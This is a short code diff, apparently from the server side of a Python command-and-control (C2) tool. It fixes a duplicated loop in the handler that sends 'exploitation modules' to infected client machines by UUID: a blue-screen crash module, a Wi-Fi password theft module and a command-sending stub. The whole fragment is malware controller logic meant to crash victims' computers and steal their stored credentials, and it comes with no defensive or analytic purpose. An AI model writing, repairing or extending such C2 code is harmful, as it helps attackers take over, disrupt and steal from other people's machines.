@@ -115,18 +115,17 @@ class C2:
         explotation_module_type = data['explotation_module']
         uuids = data['uuids']
 
-        for uuid in uuids:
-            if explotation_module_type == "bsod":
-                for uuid in uuids:
-                    self.sio.emit('pem', {"uuid": uuid, "url": 'client/pem/bsod.py'})
+        if explotation_module_type == "bsod":
+            for uuid in uuids:
+                self.sio.emit('pem', {"uuid": uuid, "url": 'client/pem/bsod.py'})
 
-            if explotation_module_type == "wifi-password":
-                for uuid in uuids:
-                    self.sio.emit('pem', {"uuid": uuid, "url": 'client/pem/wifi.py'})
+        if explotation_module_type == "wifi-password":
+            for uuid in uuids:
+                self.sio.emit('pem', {"uuid": uuid, "url": 'client/pem/wifi.py'})
 
-            if explotation_module_type == "send-command":
-                for uuid in uuids:
-                    print(data['input'])
+        if explotation_module_type == "send-command":
+            for uuid in uuids:
+                print(data['input'])
                     
 
 
